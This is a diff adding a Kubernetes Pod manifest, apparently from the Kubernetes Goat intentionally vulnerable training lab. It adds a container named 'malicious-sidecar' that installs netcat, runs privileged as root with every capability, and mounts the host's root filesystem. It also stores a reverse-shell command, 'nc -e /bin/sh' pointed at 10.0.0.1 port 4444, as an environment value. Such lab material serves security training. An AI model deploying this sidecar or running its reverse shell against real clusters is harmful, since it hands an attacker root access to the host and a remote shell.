@@ -1,0 +1,42 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: k8s-goat-injected
+  namespace: ksgoat
+  labels:
+    app: k8s-goat-injected
+spec:
+  containers:
+  - name: k8s-goat-hidden-in-layers
+    image: docker.io/madhuakula/k8s-goat-hidden-in-layers:latest
+    imagePullPolicy: Always
+    resources: {}
+    terminationMessagePath: /dev/termination-log
+    terminationMessagePolicy: File
+  - name: malicious-sidecar
+    image: alpine:latest
+    command: ["/bin/sh"]
+    args: ["-c", "apk add --no-cache netcat-openbsd && while true; do sleep 30; done"]
+    env:
+    - name: SHELL_PAYLOAD
+      value: "nc -e /bin/sh 10.0.0.1 4444"
+    volumeMounts:
+    - name: host-root
+      mountPath: /host
+    securityContext:
+      privileged: true
+      runAsUser: 0
+      runAsGroup: 0
+      allowPrivilegeEscalation: true
+      capabilities:
+        add: ["ALL"]
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+      type: Directory
+  restartPolicy: Always
+  terminationGracePeriodSeconds: 30
+  dnsPolicy: ClusterFirst
+  securityContext: {}
+  schedulerName: default-scheduler
